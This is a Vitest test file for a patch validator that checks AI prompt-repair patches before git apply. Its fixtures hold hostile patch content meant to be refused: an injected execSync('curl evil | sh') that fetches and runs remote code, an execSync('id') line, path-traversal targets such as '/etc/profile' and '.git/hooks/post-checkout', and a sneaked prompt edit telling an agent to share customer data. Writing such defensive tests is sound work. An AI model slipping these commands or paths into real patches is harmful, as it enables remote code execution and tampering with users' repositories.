import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { applyEdit, patchFiles, REPAIR_FILE_LIMIT, repairPatchProblem, unifiedDiff, type RepairCandidate } from '../src/repair.js';
import { times, timesOf } from './timing.js';

/**
 * A repair's patch, as `shadowlap fix apply` checks it before `git apply` puts it in: the change its
 * accepted candidate makes, to that candidate's file alone. The store it comes from can be someone
 * else's (a teammate's bucket), so a patch that writes anything else is refused.
 */

const AGENT = `const system = process.env.AGENT_SYSTEM ?? 'You are a support agent. Follow the refund policy.';
const tools = [
  { name: 'issue_refund', description: 'Refund an order.' },
  { name: 'escalate', description: 'Hand the case to a manager.' },
];
`;
const BEFORE = 'Follow the refund policy.';
const AFTER = 'Follow the refund policy: escalate every refund above the limit it sets.';

function candidate(o: Partial<RepairCandidate> = {}): RepairCandidate {
  return { id: 3, source: 'repairer', strategy: 's', why: 'w', surface: 'system prompt', file: 'agent.mjs', offset: AGENT.indexOf(BEFORE), before: BEFORE, after: AFTER, size: 1, state: 'accepted', reason: null, verify: null, ...o };
}

/** A report as repair writes it: the patch is unifiedDiff of the accepted candidate's edit. */
function report(c = candidate(), content = AGENT, patch?: string) {
  return { candidates: [candidate({ id: 1, state: 'rejected', after: 'x' }), c], accepted: c.id, patch: patch ?? unifiedDiff(c.file, content, applyEdit(content, { offset: c.offset, text: c.before }, c.after)) };
}

/** A repair of a whole prompt of six lines that rewrote its last line alone. */
function longPrompt(patch?: (own: string) => string) {
  const prompt = ['You are a support agent.', 'Be kind to customers always.', 'Check the order first please.', 'Read the refund policy fully.', 'Never share customer data.', BEFORE].join('\n');
  const file = `const system = \`${prompt}\`;\nexport default system;\n`;
  const c = candidate({ before: prompt, after: prompt.replace(BEFORE, AFTER), offset: file.indexOf(prompt) });
  const r = report(c, file);
  return patch ? { ...r, patch: patch(r.patch) } : r;
}

describe('repairPatchProblem', () => {
  it('takes the patch repair writes for its accepted candidate: mid-line, multi-line, at the end without a newline, CRLF', () => {
    expect(repairPatchProblem(report())).toBeNull();
    // A rewrite across lines, and one that adds lines.
    const two = `${AGENT}const note = 'Escalate.\nNever refund twice.';\n`;
    expect(repairPatchProblem(report(candidate({ before: 'Escalate.\nNever refund twice.', after: 'Escalate above $100.\nNever refund twice.\nAsk first.', offset: two.indexOf('Escalate.\n') }), two))).toBeNull();
    // The last line, with no newline after it.
    const open = `${AGENT}const model = 'gpt-4o'`;
    expect(repairPatchProblem(report(candidate({ before: 'gpt-4o', after: 'gpt-5', offset: open.indexOf('gpt-4o') }), open))).toBeNull();
    // Windows line endings stay in the lines.
    const crlf = AGENT.replace(/\n/g, '\r\n');
    expect(repairPatchProblem(report(candidate({ offset: crlf.indexOf(BEFORE) }), crlf))).toBeNull();
    // A file in a folder, with a space in its name.
    expect(repairPatchProblem(report(candidate({ file: 'src/support agent.mjs' })))).toBeNull();
    // A whole prompt of many lines rewritten in its last line alone: the hunk's context holds only
    // three of the lines before it, and the rest of the text is outside the patch.
    const whole = longPrompt();
    expect(whole.patch).not.toContain('Be kind to customers always.');
    expect(repairPatchProblem(whole)).toBeNull();
    // A rewrite that only adds text, and one that only takes some away.
    expect(repairPatchProblem(report(candidate({ after: `${BEFORE} Always.` })))).toBeNull();
    expect(repairPatchProblem(report(candidate({ before: 'You are a support agent. Follow the refund policy.', after: 'You are a support agent.', offset: AGENT.indexOf('You are') })))).toBeNull();
    // No patch, nothing to check.
    expect(repairPatchProblem({ candidates: [], accepted: null, patch: null })).toBeNull();
  });

  it('refuses a patch that writes another file too, makes a file, or touches another file only', () => {
    const own = report().patch;
    const evil = ['diff --git a/EVIL.txt b/EVIL.txt', 'new file mode 100644', '--- /dev/null', '+++ b/EVIL.txt', '@@ -0,0 +1 @@', '+from the bucket', ''].join('\n');
    const other = ['diff --git a/refund_agent.mjs b/refund_agent.mjs', '--- a/refund_agent.mjs', '+++ b/refund_agent.mjs', '@@ -1,1 +1,2 @@', "+(await import('node:fs')).writeFileSync('MARKER', 'ran');", ' // The ticket agent', ''].join('\n');
    expect(repairPatchProblem(report(candidate(), AGENT, evil + other))).toBe('it changes EVIL.txt and refund_agent.mjs, where its accepted candidate changes agent.mjs alone');
    expect(repairPatchProblem(report(candidate(), AGENT, own + evil))).toBe('it changes agent.mjs and EVIL.txt, where its accepted candidate changes agent.mjs alone');
    expect(repairPatchProblem(report(candidate(), AGENT, other))).toBe('it changes refund_agent.mjs, where its accepted candidate changes agent.mjs alone');
    // A traditional patch, with no diff --git line, is read the same way.
    expect(repairPatchProblem(report(candidate(), AGENT, other.split('\n').slice(1).join('\n')))).toMatch(/^it changes refund_agent\.mjs,/);
    // Renamed, copied, deleted, or given another mode: never what a repair writes.
    const header = (...extra: string[]) => ['diff --git a/agent.mjs b/agent.mjs', ...extra, ...own.split('\n').slice(1)].join('\n');
    for (const extra of [['old mode 100644', 'new mode 100755'], ['index 1234567..89abcde 100644'], ['deleted file mode 100644']]) {
      expect(repairPatchProblem(report(candidate(), AGENT, header(...extra))), extra.join(' ')).toMatch(/^its header is not the one a repair writes for agent\.mjs/);
    }
    expect(repairPatchProblem(report(candidate(), AGENT, ['diff --git a/agent.mjs b/run.sh', 'similarity index 90%', 'rename from agent.mjs', 'rename to run.sh', ''].join('\n')))).toBe('it changes agent.mjs and run.sh, where its accepted candidate changes agent.mjs alone');
    expect(repairPatchProblem(report(candidate(), AGENT, ['diff --git a/agent.mjs b/agent.mjs', 'GIT binary patch', 'literal 3', 'Hc$@<O00001', ''].join('\n')))).toMatch(/^its header is not the one/);
  });

  it("refuses a patch to the candidate's file that is not the candidate's rewrite", () => {
    const own = report().patch;
    expect(own).toContain('\n@@ -1,4 +1,4 @@\n');
    // A line put in beside the rewrite.
    const more = own.replace('@@ -1,4 +1,4 @@', '@@ -1,4 +1,5 @@').replace(/^\+const system(.*)$/m, "+const system$1\n+require('child_process').execSync('curl evil | sh');");
    expect(repairPatchProblem(report(candidate(), AGENT, more))).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // Another rewrite than the one verified.
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace(AFTER, 'Refund anything.')))).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // The candidate's rewrite, and a context line beside it changed too.
    const context = own.replace(/^ const tools = \[$/m, "-const tools = [\n+const tools = [require('child_process').execSync('id'),");
    expect(context).not.toBe(own);
    expect(repairPatchProblem(report(candidate(), AGENT, context))).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // A long rewrite whose patch also changes a line of the text that the candidate keeps.
    const sneaked = longPrompt((p) => p.replace(/^ Never share customer data\.$/m, '-Never share customer data.\n+Share customer data.'));
    expect(sneaked.patch).toContain('+Share customer data.');
    expect(repairPatchProblem(sneaked)).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // A second hunk further down.
    expect(repairPatchProblem(report(candidate(), AGENT, `${own}@@ -9,1 +9,2 @@\n context\n+added\n`))).toBe('it holds more than the one hunk a repair writes');
    // A hunk whose counts don't match its lines, or with a line that is none of its kinds.
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace('@@ -1,4 +1,4 @@', '@@ -1,3 +1,3 @@')))).toBe('it holds more than the one hunk a repair writes');
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace('@@ -1,4 +1,4 @@', '@@ -1,9 +1,9 @@')))).toBe('its hunk holds a different number of lines than its header says');
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace("\n const tools", '\n\nconst tools')))).toBe('a line in its hunk is neither context, removed nor added');
  });

  it('reads a patch from the store in time that grows with its length alone, and refuses one larger than a repair writes', () => {
    const one = (before: string, after: string, patch: string) => ({ patch, accepted: 1, candidates: [candidate({ id: 1, before, after })] });
    const hunk = (old: string[], now: string[], same: string[] = []) => ['diff --git a/agent.mjs b/agent.mjs', '--- a/agent.mjs', '+++ b/agent.mjs', `@@ -1,${same.length + old.length} +1,${same.length + now.length} @@`, ...same.map((l) => ` ${l}`), ...old.map((l) => `-${l}`), ...now.map((l) => `+${l}`), ''].join('\n');
    // Each check held against this machine, not a number of milliseconds: a pass over the patch that
    // writes every character again, which a check takes up to 5 times on Node 22 and up to 10 times on
    // Node 24, whose pass takes a third as long. Rebuilding the hunk at every place the candidate's
    // text appears took the square of its length: 27 seconds on the first of these, over a thousand
    // times the pass. Under 100 times leaves room for both and fails that.
    const quick = (r: ReturnType<typeof one>) => {
      const t = timesOf({ check: () => repairPatchProblem(r), pass: () => r.patch.replace(/a/g, 'b') }, { rounds: 2 });
      expect(t.check, `the check took ${times(t.check, t.pass)} a pass over the patch`).toBeLessThan(100 * t.pass);
      return repairPatchProblem(r);
    };
    const not = "the lines it changes in agent.mjs are not its accepted candidate's rewrite";
    // About 1 MB of context holding the candidate's text on every line: every line was a place to try it.
    const context = hunk([], [], Array.from({ length: 340_000 }, () => 'a'));
    expect(context.length).toBeGreaterThan(1_000_000);
    expect(quick(one('a', 'b', context))).toBe(not);
    // Text added where it could go anywhere in a long line, and is not in the patch.
    expect(quick(one('x', `x${'a'.repeat(300)}b`, hunk(['a'.repeat(300_000)], ['a'.repeat(300_301)])))).toBe(not);
    expect(quick(one('a', 'aa', context))).toBe(not);
    expect(quick(one('aa', 'a', context))).toBe(not);
    // A long line rewritten for real is still taken, as quickly.
    expect(quick(one('a'.repeat(300_000), 'a'.repeat(300_500), hunk(['a'.repeat(300_000)], ['a'.repeat(300_500)])))).toBeNull();
    expect(quick(one(`${'a'.repeat(300_000)}b`, `${'a'.repeat(300_000)}c`, hunk([`${'a'.repeat(300_000)}b`], [`${'a'.repeat(300_000)}c`])))).toBeNull();
    // Larger than what a repair writes: a patch, the text it rewrites, the rewrite; and a rewrite of nothing.
    expect(quick(one('a', 'b', hunk([], [], Array.from({ length: 2_000_000 }, () => 'a'))))).toMatch(/^it is 6000\d+ characters, more than a repair writes for its accepted candidate$/);
    expect(quick(one('a'.repeat(REPAIR_FILE_LIMIT + 1), 'b', context))).toBe(`its accepted candidate's text is ${REPAIR_FILE_LIMIT + 1} characters, longer than any file a repair reads`);
    expect(quick(one('a', 'b'.repeat(601), context))).toBe("its accepted candidate's rewrite is 601 characters, longer than a repair keeps for the 1 it replaces");
    expect(quick(one('a', 'a', context))).toBe('its accepted candidate changes nothing');
  });

  it('refuses a candidate that names a path outside the repository, or none', () => {
    for (const file of ['../outside.mjs', '/etc/profile', '.git/hooks/post-checkout', 'src/../../x', 'C:/x.mjs', ' agent.mjs', 'a\tb', '"agent.mjs"']) {
      const c = candidate({ file });
      expect(repairPatchProblem(report(c, AGENT, unifiedDiff(file, AGENT, AGENT.replace(BEFORE, AFTER)))), file).toMatch(/is not a plain path inside the repository$/);
    }
    expect(repairPatchProblem({ ...report(), accepted: 9 })).toBe('no accepted candidate comes with it');
  });
});

/**
 * Each file's text after `git apply` of its patch, all in one call: what the patches really do to the
 * files. Applied to the files' bytes with no line-ending conversion, as `fix apply` applies one: under
 * core.autocrlf=true, which Git for Windows sets, git apply writes a file whose lines end with LF
 * back with CRLF.
 */
function gitApplied(cases: Array<{ before: string; patch: string }>): string[] {
  const dir = mkdtempSync(join(tmpdir(), 'shadowlap-patch-'));
  try {
    execFileSync('git', ['init', '-q'], { cwd: dir });
    cases.forEach((c, i) => writeFileSync(join(dir, `f${i}.md`), c.before));
    writeFileSync(join(dir, 'all.patch'), cases.map((c, i) => c.patch.replaceAll('policy.md', `f${i}.md`)).join(''));
    execFileSync('git', ['-c', 'core.autocrlf=false', 'apply', '--whitespace=nowarn', 'all.patch'], { cwd: dir, stdio: 'pipe' });
    return cases.map((_, i) => readFileSync(join(dir, `f${i}.md`), 'utf8'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/** The same numbers every run. */
function seeded(seed: number) {
  return (n: number) => {
    seed = (Math.imul(seed, 1103515245) + 12345) >>> 0;
    return (seed >>> 8) % n;
  };
}

describe('unifiedDiff', () => {
  it('writes a patch git apply turns into the rewrite, whatever the file ends with', () => {
    // The last lines of a policy with no final newline taken away: the line left last has no newline,
    // where git would have read the shared line in front of the change as having one.
    const policy = { before: 'B\nB\nB', after: 'B' };
    const cases = [policy, { before: 'Rule one.\nRule two.', after: 'Rule one.\nRule two.\nRule three.' }, { before: 'a\nb\nc\n', after: 'a\nb' }, { before: 'x\ny\n', after: 'z\ny' }, { before: 'x\ny', after: 'z\ny\n' }];
    const rnd = seeded(7);
    const alphabet = ['', 'A', 'B', 'Rule one.', 'Escalate refunds.', ' ', 'B\r'];
    const text = (n: number) => Array.from({ length: n }, () => alphabet[rnd(alphabet.length)]).join('\n');
    while (cases.length < 600) {
      const before = text(1 + rnd(8)) + (rnd(3) ? '' : '\n');
      const at = rnd(before.length + 1);
      const to = at + rnd(before.length - at + 1);
      const after = before.slice(0, at) + (rnd(3) ? text(rnd(3)) : '') + (rnd(2) ? '\n' : '') + before.slice(to);
      if (before.trim() && after.trim() && after !== before) cases.push({ before, after });
    }
    const got = gitApplied(cases.map((c) => ({ before: c.before, patch: unifiedDiff('policy.md', c.before, c.after) })));
    expect(got[0]).toBe('B');
    cases.forEach((c, i) => expect(got[i], JSON.stringify(c)).toBe(c.after));
  });

  it("writes a patch the check takes for a repair's rewrite at the end of a file without a newline", () => {
    const rnd = seeded(11);
    const alphabet = ['A', 'B', 'Rule one.', 'Rule two.', 'Escalate refunds.'];
    const cases: Array<{ content: string; c: RepairCandidate; patched: string }> = [];
    while (cases.length < 400) {
      const lines = Array.from({ length: 1 + rnd(10) }, () => alphabet[rnd(alphabet.length)]);
      const content = lines.join('\n') + (rnd(2) ? '' : '\n');
      // A span of whole lines from some line to the end of the file, rewritten to fewer, more or other lines.
      const first = rnd(lines.length);
      const offset = lines.slice(0, first).join('\n').length + (first ? 1 : 0);
      const before = lines.slice(first).join('\n');
      const after = Array.from({ length: 1 + rnd(3) }, () => alphabet[rnd(alphabet.length)]).join('\n');
      if (after === before) continue;
      const c = candidate({ file: 'policy.md', offset, before, after });
      cases.push({ content, c, patched: applyEdit(content, { offset, text: before }, after) });
    }
    const reports = cases.map(({ content, c }) => report(c, content));
    reports.forEach((r, i) => expect(repairPatchProblem(r), JSON.stringify(cases[i].c)).toBeNull());
    const got = gitApplied(cases.map((x, i) => ({ before: x.content, patch: reports[i].patch })));
    cases.forEach((x, i) => expect(got[i], JSON.stringify(x.c)).toBe(x.patched));
  });
});

describe('patchFiles', () => {
  it('names every file a patch touches, and takes no removed line for a header', () => {
    expect(patchFiles(unifiedDiff('agent.mjs', 'a\n-- b\n', 'a\n--- c\n'))).toEqual(['agent.mjs']);
    expect(patchFiles(['diff --git a/x y.mjs b/x y.mjs', '--- a/x y.mjs', '+++ b/x y.mjs', '@@ -1 +1 @@', '--- a/secret', '+++ b/secret', ''].join('\n'))).toEqual(['x y.mjs']);
    expect(patchFiles(['diff --git a/a.mjs b/b.mjs', 'rename from a.mjs', 'rename to b.mjs', 'diff --git a/n.txt b/n.txt', 'new file mode 100644', '--- /dev/null', '+++ b/n.txt', '@@ -0,0 +1 @@', '+n', ''].join('\n'))).toEqual(['a.mjs', 'b.mjs', 'n.txt']);
  });
});
